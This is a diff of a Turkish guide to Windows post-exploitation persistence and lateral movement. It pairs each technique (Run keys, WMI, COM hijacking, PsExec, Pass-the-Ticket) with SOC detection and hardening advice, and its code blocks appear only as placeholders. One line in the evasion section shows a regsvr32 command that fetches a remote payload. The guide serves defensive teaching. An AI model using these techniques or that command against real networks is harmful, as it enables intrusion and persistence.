@@ -1,6 +1,5 @@
 Başlık: Windows'ta Kalıcılık ve Yatay Hareket — Sızma Sonrası Tam Rehber
 
-
 ---
 
 Bir saldırgan hedef sisteme ilk erişimi (Initial Access) sağladığında gerçek mücadele yeni başlar. Kimlik avı e-postası tıklandı, zafiyet istismar edildi ya da VPN kimlik bilgisi ele geçirildi — ama bu yalnızca kapıdan girmektir. Asıl hedef; fark edilmeden kalmak, köklü bir yer edinmek ve ağın derinliklerine yayılmaktır.
@@ -20,12 +19,9 @@ Sıkılaştırma (Hardening): Önleyici savunma adımları.
 
 Bölüm: Windows Sistemlerde Kalıcılık (Persistence) Mekanizmaları
 
-
 Kalıcılık yöntemleri, bir sistemin yeniden başlatılması veya kullanıcı oturumunun kapatılması durumunda bile zararlı yazılımların veya yetkisiz erişimlerin devam etmesini sağlar. Saldırganlar bu aşamada mümkün olduğunca sessiz olmayı tercih eder: antivirüs atlatılmalı, log kayıtları minimum düzeyde tutulmalı, meşru sistem araçlarıyla iç içe geçilmelidir.
 
-
 Bölüm Detayı: Kullanıcı Manipülasyonu
-
 
 Saldırganlar Administrator hesabını ele geçirdiğinde, bu hesabın faaliyetleri izlendiği için doğrudan kullanmak yerine yeni ve "sıradan görünen" kullanıcılar oluştururlar. Bu kullanıcılar genellikle support, sysadmin, helpdesk gibi adlar taşır — SOC ekibinin radarına girme ihtimali düşüktür.
 
@@ -35,34 +31,19 @@ Mevcut kullanıcıları listelemek için:
 
 [Kod Bloğu: Burada bir kod örneği yer almaktadır. Kod içeriği seslendirmede atlanmıştır.]
 
-
 [Görsel: Görsel açıklaması yok]
-
 
 SOC Tespiti — Event ID'leri:
 
-[Tablo Başlangıcı]
-Event ID: 4720. Anlam: Yeni kullanıcı hesabı oluşturuldu.
-Event ID: 4726. Anlam: Kullanıcı hesabı silindi.
-Event ID: 4732. Anlam: Kullanıcı bir gruba eklendi (Administrators gibi).
-[Tablo Bitişi]
-
-
 Event Viewer → Windows Logs → Security üzerinden bu Event ID'leri filtreleyerek iz sürülebilir.
 
-
 [Görsel: Görsel açıklaması yok]
 
-
-
 [Görsel: Görsel açıklaması yok]
-
 
 ---
 
-
 Bölüm Detayı: Zamanlanmış Görevler (Scheduled Tasks)
-
 
 Fidye yazılımlarından APT gruplarına kadar kalıcılık için en yaygın kullanılan yöntemlerden biridir. Saldırgan, zararlı dosyanın belirli aralıklarla ya da sistem açılışında çalışmasını sağlar.
 
@@ -70,9 +51,7 @@ Fidye yazılımlarından APT gruplarına kadar kalıcılık için en yaygın kul
 
 Sysinternals Autoruns aracı, zamanlanmış görevleri imza doğrulamasıyla birlikte listeler; Microsoft imzalı olmayan görevler kırmızı ile işaretlenir.
 
-
 [Görsel: Görsel açıklaması yok]
-
 
 SOC Tespiti:
 Event ID 4698: Yeni zamanlanmış görev oluşturuldu.
@@ -80,9 +59,7 @@ Autoruns → Scheduled Tasks sekmesi.
 
 ---
 
-
 Bölüm Detayı: Kayıt Defteri Çalıştırma Anahtarları (Registry Run Keys)
-
 
 Registry Run key'leri, Windows'un meşru bir özelliğidir; sistem açılışında veya kullanıcı oturum açtığında belirtilen programları otomatik çalıştırır. MITRE ATT&CK verilerine göre T1547.001 tekniği, 54'ten fazla bilinen tehdit grubu tarafından kullanılmaktadır.
 
@@ -100,17 +77,11 @@ Startup Klasörü Yönlendirme Anahtarları:
 
 Registry değişikliklerini görselleştirmek için regedit veya Autoruns kullanılabilir:
 
+[Görsel: Görsel açıklaması yok]
 
 [Görsel: Görsel açıklaması yok]
 
-
-
 [Görsel: Görsel açıklaması yok]
-
-
-
-[Görsel: Görsel açıklaması yok]
-
 
 SOC Tespiti:
 Event ID 4657: Registry değeri değiştirildi/oluşturuldu (Auditing etkin olmalı).
@@ -118,27 +89,19 @@ Sysmon Event ID 12 (anahtar oluşturma/silme) ve 13 (değer değişikliği).
 
 ---
 
-
 Bölüm Detayı: Startup Klasörü
-
 
 [Kod Bloğu: Burada bir kod örneği yer almaktadır. Kod içeriği seslendirmede atlanmıştır.]
 
 Çalıştır (Win+R) → shell:startup ile erişilebilir:
 
-
 [Görsel: Görsel açıklaması yok]
 
-
-
 [Görsel: Görsel açıklaması yok]
-
 
 ---
 
-
 Bölüm Detayı: Windows Servisleri
-
 
 Saldırganlar sc create komutuyla meşru isimler taşıyan (ör. ChromeUpdateService) yeni servisler oluşturabilir veya mevcut servisleri ele geçirebilir.
 
@@ -150,9 +113,7 @@ Autoruns → Services sekmesi.
 
 ---
 
-
 Bölüm Detayı: BITS Jobs (Background Intelligent Transfer Service)
-
 
 BITS, Windows'un dosya transfer altyapısıdır; güvenlik duvarları tarafından genellikle engellenmez. Saldırganlar BITS üzerinden dosya indirip çalıştırabilir ve güvenlik araçlarının radarından kaçabilir.
 
@@ -162,9 +123,7 @@ Tespiti: bitsadmin /list /verbose veya Sysmon süreç yaratma logları.
 
 ---
 
-
 Bölüm Detayı: WMI Event Subscriptions — Disksiz (Fileless) Kalıcılık
-
 
 WMI (Windows Management Instrumentation), gelişmiş tehdit aktörlerinin disk üzerinde iz bırakmadan kalıcılık sağladığı en sofistike yöntemlerden biridir. Payload registry ve WMI veritabanında saklanır; geleneksel antivirüs taramaları dosya sistemi odaklı olduğundan bu tekniği genellikle atlayabilir.
 
@@ -183,9 +142,7 @@ Get-WMIObject -Namespace root\subscription -Class __EventFilter ile manuel sorgu
 
 ---
 
-
 Bölüm Detayı: COM Hijacking
-
 
 COM (Component Object Model), Windows uygulamalarının birbirleriyle iletişim kurduğu bir altyapıdır. Her COM nesnesi registry'de bir CLSID ile kayıtlıdır. Saldırganlar HKCU\Software\Classes\CLSID altına meşru bir COM nesnesinin CLSID'ini kopyalayarak kendi kötü amaçlı DLL'lerini yükletebilir — bunu yapmak için yönetici yetkisi bile gerekmez.
 
@@ -197,9 +154,7 @@ Tespit: Sysmon Event ID 7 (Image Load) — meşru süreçlerin C:\Users\ yolunda
 
 ---
 
-
 Bölüm Detayı: IFEO (Image File Execution Options) Enjeksiyonu
-
 
 IFEO, geliştiricilerin bir uygulamayı başlatıldığında hata ayıklayıcıya bağlamasını sağlar. Saldırganlar bu mekanizmayı, engellilik kısayol tuşlarına bağlı sistem uygulamalarının (sethc.exe — Sticky Keys, utilman.exe — Erişilebilirlik) yerine kendi arka kapılarını çalıştırmak için kullanır. Bu yöntem özellikle dikkat çekicidir çünkü giriş ekranından, yani herhangi bir kullanıcı oturumu açmadan çalıştırılabilir.
 
@@ -213,9 +168,7 @@ Event ID 4688: Olağandışı parent-child süreç ilişkisi (sethc.exe → cmd.
 
 ---
 
-
 Bölüm Detayı: DLL Search Order Hijacking / Sideloading
-
 
 Windows bir DLL'i yüklerken belirli bir sırayla arama yapar: önce uygulamanın kendi dizini, sonra sistem dizinleri. Saldırganlar, meşru ve dijital imzalı bir uygulamanın çalıştığı dizine aynı isimde kötü amaçlı bir DLL yerleştirerek yasal süreçler aracılığıyla kod çalıştırabilir.
 
@@ -233,12 +186,9 @@ Tespit: Sysmon Event ID 7 — imzasız veya beklenmedik yoldan DLL yüklenmesi.
 
 Bölüm: Kalıcılıktan Yatay Harekete — Köprü
 
-
 Bu bölüm detayları ve etkileri incelemektedir.
 
-
 Bölüm Detayı: Saldırgan Neden Yerinde Durmaz?
-
 
 Saldırgan ilk makineyi ele geçirdiğinde bu genellikle bir son kullanıcı iş istasyonudur: sınırlı erişim, sınırlı veri, sınırlı etki. Gerçek hedef ağdaki kritik varlıklardır:
 
@@ -247,9 +197,7 @@ Dosya Sunucuları: Hassas belgeler, kaynak kodları.
 Yedekleme Sunucuları: Veri şifreleme (ransomware) için ideal hedef.
 SIEM/Log Sunucuları: İzlerin silinmesi.
 
-
 Bölüm Detayı: Active Directory: Saldırganın Altın Madeni
-
 
 Kurumsal ağların büyük çoğunluğu Active Directory (AD) altyapısı üzerinde çalışır. AD, merkezi kimlik yönetimi sağlar; bu da onu hem saldırganlar için birincil hedef, hem de bir kez ele geçirildiğinde tüm ağın kapılarını açan bir "master key" haline getirir.
 
@@ -267,27 +215,20 @@ Bu noktadan itibaren saldırgan elindeki kimlik bilgileri ve hash'lerle yatay ha
 
 Bölüm: Ağ İçinde Yatay Hareket (Lateral Movement)
 
-
 Yatay hareket, saldırganın ağ içindeki diğer sistemlere erişim sağlaması sürecidir. Bir APT grubunun lateral movement aşamasında ortalama süre, kurumsal ağlarda 4-5 gün olmakla birlikte bu süre bazen haftalara uzayabilir. Saldırganlar bu süreçte mümkün olduğunca "gürültüsüz" çalışmayı, meşru araçları kullanmayı (Living off the Land — LotL) ve normal trafik içinde eriyip gitmeyi hedefler.
-
 
 Bölüm Detayı: RDP (Remote Desktop Protocol) — APT'lerin Favorisi
 
-
 RDP, Microsoft'un uzak masaüstü bağlantı protokolüdür ve port 3389 üzerinden çalışır. APT gruplarının lateral movement aracısı olarak en sık kullandığı protokoldür; bunun ana nedeni RDP'nin kurumsal ağlarda zaten yaygın olmasıdır — normal trafik içinde kaybolur.
 
-
 [Görsel: Görsel açıklaması yok]
-
 
 RDP'nin Temel Özellikleri:
 Uzaktan Erişim: Tam masaüstü kontrolü.
 TLS Şifreleme: Güvenli veri iletimi (eski sürümlerde zafiyetler mevcut — BlueKeep, CVE-2019-0708).
 Kerberos Entegrasyonu: AD ortamında kimlik doğrulama Kerberos protokolü üzerinden yapılır.
 
-
 [Görsel: Görsel açıklaması yok]
-
 
 APT'lerin RDP ile Lateral Movement Yöntemleri:
 
@@ -303,9 +244,7 @@ APT29 (Cozy Bear / Rusya): Ele geçirilmiş RDP oturumlarıyla iç ağda yayılm
 
 ---
 
-
 Bölüm Detayı: WinRM & PowerShell Remoting — Living off the Land
-
 
 Windows Remote Management (WinRM), Windows'un yerleşik uzaktan yönetim protokolüdür ve portlar 5985 (HTTP) ve 5986 (HTTPS) üzerinden çalışır. Sistem yöneticilerinin günlük yönetim için kullandığı bu altyapı, saldırganların "arazi üzerinde yaşama" (Living off the Land — LotL) taktiği için birebir uygundur.
 
@@ -324,9 +263,7 @@ PowerShell Script Block Logging (Event ID 4104).
 
 ---
 
-
 Bölüm Detayı: SMB Share ve PsExec — Klasik Ama Etkili
-
 
 SMB (Server Message Block), Windows'un dosya paylaşım protokolüdür (port 445). Saldırganlar özellikle yönetici paylaşımları olan ADMIN$ ve C$ üzerinden lateral movement gerçekleştirir.
 
@@ -346,9 +283,7 @@ Sysmon Event ID 11: ADMIN$ paylaşımına dosya bırakma.
 
 ---
 
-
 Bölüm Detayı: Kerberos İstismarları: PtT ve Overpass-the-Hash
-
 
 Active Directory ortamlarında kimlik doğrulama Kerberos protokolüyle gerçekleşir. Kerberos'un "stateless" (durumsuz) mimarisi — yani bilet tabanlı çalışması — bazı kritik saldırı vektörlerine kapı açar.
 
@@ -356,17 +291,13 @@ Kerberos Bilet Sistemi:
 TGT (Ticket Granting Ticket): Kullanıcı giriş yaptığında KDC (Key Distribution Center) tarafından verilir.
 TGS (Ticket Granting Service): Belirli servislere erişim için TGT ile talep edilir.
 
-
 Bölüm Detayı: Pass-the-Ticket (PtT)
-
 
 Bellekten çalınan bir Kerberos bileti, başka bir sistemde kimlik doğrulama için kullanılabilir. Bilet geçerlilik süresi dolmadığı sürece (varsayılan 10 saat) şifre değiştirilse bile çalışır.
 
 [Kod Bloğu: Burada bir kod örneği yer almaktadır. Kod içeriği seslendirmede atlanmıştır.]
 
-
 Bölüm Detayı: Overpass-the-Hash
-
 
 NTLM hash'ini kullanarak Kerberos TGT bileti talep etme yöntemidir. Bu teknikle saldırgan, hash'i doğrudan NTLM kimlik doğrulamasında kullanmak yerine onu Kerberos biletiyle değiştirerek daha az iz bırakır.
 
@@ -389,12 +320,9 @@ Event ID 4771: Kerberos ön kimlik doğrulama başarısız.
 
 Bölüm: Blue Team / SOC Perspektifinden Tespit ve Tehdit Avcılığı
 
-
 Bu bölüm detayları ve etkileri incelemektedir.
 
-
 Bölüm Detayı: Tespit Felsefesi: Tek Log Yerine Anomali Zinciri
-
 
 Bireysel log kayıtları çoğu zaman yanıltıcıdır. Meşru yazılımlar da Run anahtarlarını değiştirebilir, sistem yöneticileri de PsExec kullanır. Etkili tespit için korelasyon gereklidir: birden fazla olayı bir araya getirerek anlam çıkarmak.
 
@@ -402,35 +330,11 @@ Bireysel log kayıtları çoğu zaman yanıltıcıdır. Meşru yazılımlar da R
 
 ---
 
-
 Bölüm Detayı: Event ID Referans Tablosu
-
-
-[Tablo Başlangıcı]
-Event ID: 4720. Kaynak: Windows Security. Anlam: Kullanıcı oluşturuldu.
-Event ID: 4726. Kaynak: Windows Security. Anlam: Kullanıcı silindi.
-Event ID: 4732. Kaynak: Windows Security. Anlam: Gruba üye eklendi.
-Event ID: 4697. Kaynak: Windows Security. Anlam: Servis kuruldu.
-Event ID: 4698. Kaynak: Windows Security. Anlam: Zamanlanmış görev oluşturuldu.
-Event ID: 4624 (Type 3). Kaynak: Windows Security. Anlam: Ağ üzerinden oturum açma.
-Event ID: 4624 (Type 10). Kaynak: Windows Security. Anlam: Uzak etkileşimli oturum (RDP).
-Event ID: 4657. Kaynak: Windows Security. Anlam: Registry değeri değiştirildi.
-Event ID: 4768. Kaynak: Windows Security. Anlam: Kerberos TGT talebi.
-Event ID: 4769. Kaynak: Windows Security. Anlam: Kerberos TGS talebi.
-Event ID: 1. Kaynak: Sysmon. Anlam: Süreç oluşturma.
-Event ID: 3. Kaynak: Sysmon. Anlam: Ağ bağlantısı.
-Event ID: 7. Kaynak: Sysmon. Anlam: DLL yükleme.
-Event ID: 11. Kaynak: Sysmon. Anlam: Dosya oluşturma.
-Event ID: 12/13. Kaynak: Sysmon. Anlam: Registry oluşturma/değişiklik.
-Event ID: 19/20/21. Kaynak: Sysmon. Anlam: WMI Event aboneliği.
-[Tablo Bitişi]
-
 
 ---
 
-
 Bölüm Detayı: Sysmon ile Derinlemesine Telemetri
-
 
 Sysmon (System Monitor), Windows'un yerel log altyapısını önemli ölçüde zenginleştirir. Registry değişiklikleri için kritik event ID'ler:
 
@@ -439,15 +343,11 @@ Event ID 13 (RegistryEvent - Value Set): Mevcut anahtar değerinin değiştirilm
 
 Her Sysmon kaydı ParentImage ve ParentCommandLine alanlarını içerir — değişikliği kimin yaptığını ve bu sürecin nasıl başlatıldığını gösterir. Bu alan, saldırı zincirini geriye doğru takip etmek için kritiktir.
 
-
 [Görsel: Görsel açıklaması yok]
-
 
 ---
 
-
 Bölüm Detayı: EDR/XDR Korelasyon Zinciri
-
 
 XDR platformları, izole olayları bir saldırı hikayesine dönüştürür. Örnek bir persistence → C2 zinciri:
 
@@ -456,15 +356,11 @@ Dosya Bırakma: C:\Users\Public\payload.exe oluşturuldu (Sysmon EID 11).
 Kalıcılık: HKCU\...\Run anahtarına yazıldı (Sysmon EID 13).
 C2 Bağlantısı: Bilinmeyen IP:443'e bağlantı (Sysmon EID 3).
 
-
 [Görsel: Görsel açıklaması yok]
-
 
 ---
 
-
 Bölüm Detayı: Pratik SOC Senaryoları — KQL Pseudo-Code
-
 
 Senaryo 1: Şüpheli Konumdan Registry Yazma
 
@@ -484,9 +380,7 @@ Senaryo 4: Kerberos Anomali — Olağandışı Bilet Talebi
 
 ---
 
-
 Bölüm Detayı: Yanlış Pozitif Yönetimi
-
 
 Meşru yazılımlar (antivirüs güncellemeleri, kurumsal araçlar) da Run anahtarlarını değiştirebilir. Gürültüyü azaltmak için:
 
@@ -496,9 +390,7 @@ Whitelist: C:\Program Files\ ve C:\Windows\ altından çalışan, imzalı uygula
 
 ---
 
-
 Bölüm Detayı: Saldırgan Gizlenme Taktikleri
-
 
 Null Karakterle Gizleme:
 
@@ -524,18 +416,13 @@ regsvr32.exe /s /n /u /i:http://... → COM object üzerinden payload.
 
 Bölüm: Sıkılaştırma ve Savunma (Hardening)
 
-
 Bu bölüm detayları ve etkileri incelemektedir.
-
 
 Bölüm Detayı: Privileged Access Management (PAM)
 
-
 PAM, kurumsal ağlarda yüksek ayrıcalıklı erişimleri yönetmek, izlemek ve denetlemek için kullanılan merkezi bir güvenlik çözümüdür.
 
-
 [Görsel: Görsel açıklaması yok]
-
 
 PAM'ın Sağladığı Korumalar:
 
@@ -548,9 +435,7 @@ PAM ve RDP İlişkisi: Bir PAM çözümü devredeyken RDP oturumları doğrudan 
 
 ---
 
-
 Bölüm Detayı: Ağ Seviyesinde Kimlik Doğrulama (NLA)
-
 
 NLA (Network Level Authentication), RDP oturumu kurulmadan önce kimlik doğrulaması yapılmasını zorunlu kılar. Bu, kimlik doğrulanmamış bağlantı isteklerinin sisteme ulaşmasını engeller.
 
@@ -558,9 +443,7 @@ NLA (Network Level Authentication), RDP oturumu kurulmadan önce kimlik doğrula
 
 ---
 
-
 Bölüm Detayı: Çok Faktörlü Kimlik Doğrulama (MFA)
-
 
 RDP, WinRM ve diğer uzaktan erişim yöntemleri için MFA zorunlu olmalıdır. Kimlik bilgileri ele geçirilse bile ikinci faktör olmadan giriş mümkün olmaz.
 
@@ -570,9 +453,7 @@ Donanım anahtarları (FIDO2 / YubiKey).
 
 ---
 
-
 Bölüm Detayı: Least Privilege (En Az Ayrıcalık) Prensibi
-
 
 Her kullanıcı ve servis hesabı yalnızca görevini yapabilmek için gereken minimum yetkiyle çalışmalıdır.
 
@@ -586,9 +467,7 @@ Domain Admin hesaplarını yalnızca DC üzerinde kullanın.
 
 ---
 
-
 Bölüm Detayı: Ağ Segmentasyonu ve Erişim Kontrolü
-
 
 [Kod Bloğu: Burada bir kod örneği yer almaktadır. Kod içeriği seslendirmede atlanmıştır.]
 
@@ -599,9 +478,7 @@ Mikro-segmentasyon: Host-based firewall kurallarıyla East-West trafiği kısıt
 
 ---
 
-
 Bölüm Detayı: Audit Politikaları ve Merkezi Log Yönetimi
-
 
 [Kod Bloğu: Burada bir kod örneği yer almaktadır. Kod içeriği seslendirmede atlanmıştır.]
 
@@ -611,9 +488,7 @@ Sysmon yapılandırmasını SwiftOnSecurity veya Olaf Hartong şablonlarıyla da
 
 ---
 
-
 Bölüm Detayı: Proaktif Tehdit Avcılığı
-
 
 Reaktif olmak yetmez. Blue Team düzenli aralıklarla şu kontrolleri yapmalıdır:
 
